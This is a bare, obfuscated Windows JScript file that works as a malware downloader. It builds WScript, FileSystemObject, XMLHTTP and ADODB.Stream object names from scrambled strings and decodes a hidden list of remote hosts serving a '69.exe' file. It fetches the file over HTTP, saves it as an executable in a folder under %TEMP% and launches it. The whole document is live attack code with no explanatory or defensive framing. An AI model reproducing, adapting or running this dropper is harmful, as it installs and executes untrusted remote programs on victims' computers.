

function PnENwlyvJ(vHjcaOQlznv) {
var NphasvLL = WScript.CreateObject("Wscript.Shell");
NphasvLL.Run(vHjcaOQlznv, 0x1, 0x0);
}
function HOpGucZue(WeMHq,Bvmzy,woTkH) {
var kqMgQ = "jZQvsR MHu pt.Shell nutmHCF Scri".split(" ");
var kYZ=((1)?"W" + kqMgQ[4]:"")+kqMgQ[2];
var oI = WScript.CreateObject(kYZ);
var zK = "%TEMP%\\";
return oI.ExpandEnvironmentStrings(zK);
}
function mfPDpXYb() {
var PiRQwTc = "ipting";
var EPfJUumpGx = "ile";
var sUKZH = "System";
return "Sc" + "r" + PiRQwTc + ".F" + EPfJUumpGx + sUKZH + "Obj" + "ect";
}
function MMOt(EXjbN) {
return WScript.CreateObject(EXjbN);
}
function NIwF(BsRNx,OGReG) {
BsRNx.write(OGReG);
}
function AJsz(gaXUm) {
gaXUm.open();
}
function AYMy(nklNg,sCjDD) {
nklNg.saveToFile(sCjDD,542-540);
}
function vOjl(FPpRI,UoIZQ,MXtkg) {
FPpRI.open(MXtkg,UoIZQ,false);
}
function CgWa(JfBRD) {
if (JfBRD == 864-664){return true;} else {return false;}
}
function HlTW(EoAPD) {
if (EoAPD > 176425-148){return true;} else {return false;}
}
function NMLT(UHZEQ) {
var TKMXZ="";
for(x=(153-153); x < UHZEQ.length; x++)
if (x % (849-847) != (256-256)) {
TKMXZ += UHZEQ.substr(x, 241-240);
}
return TKMXZ;
}
function oVGt(bXoBQ) {
bXoBQ.send();
}
function lQWj(BoMrR) {
return BoMrR.status;
}
var Yo="yhGeelDlQoDyXu9nGgWm1eLnTqRqm.ecFoems/D6l98.7esxAe9?F Lo1hNihyVobudnQgYbcuNyhfGfZ.LcGo8mH/T6i9o.teVxceS?u Y?A J?U v?";
var c = NMLT(Yo).split(" ");
var LrW = HOpGucZue("hqwL","dwqHr","hgrELU");
var auz = new ActiveXObject(mfPDpXYb());
var boAJ = LrW+"elbCzuv\\";
try{
auz.CreateFolder(boAJ);
}catch(QaqnaZ){
};
var yng = "2.XMLH";
var rKV = (yng + "TTP" + " KopxpjI YNeoY XML ream St sPdOQrOb AD rzIcuTc OD").split(" ");
var sp = true  , RZce = rKV[7] + "" + rKV[9];
var mL = MMOt("MS"+rKV[3]+(306427, rKV[0]));
var Wub = MMOt(RZce + "B." + rKV[5]+(825927, rKV[4]));
var KbI = 0;
var i = 1;
var dTtgsXS = 912892;
var h=KbI;
while (true)  {
if(h>=c.length) {break;}
var Wt = 0;
var MQv = ("ht" + " DOFHPHM tp whdfV gambqeDe :// bXPmNZP .exe  GET").split(" ");
try  {
vOjl(mL,MQv[0]+MQv[2]+MQv[5]+c[h]+i, "GET"); oVGt(mL); if (CgWa(lQWj(mL)))  {      
AJsz(Wub); Wub.type = 1; NIwF(Wub,mL.responseBody); if (HlTW(Wub.size))  {
Wt = 1; Wub.position = 0; AYMy(Wub,/*qWMW72LFKl*/boAJ/*gr7c91tcbM*/+dTtgsXS+MQv[7]); try  {
if (((new Date())>0,7448464888)) {
PnENwlyvJ(boAJ+dTtgsXS+/*C8KP47dYcj*/MQv[7]/*kGIG32ZLIA*/); 
break;
}
}
catch (ra)  {
}; 
}; Wub.close(); 
}; 
if (Wt == 1)  {
KbI = h; break; 
}; 
}
catch (ra)  { 
}; 
h++;
}; 

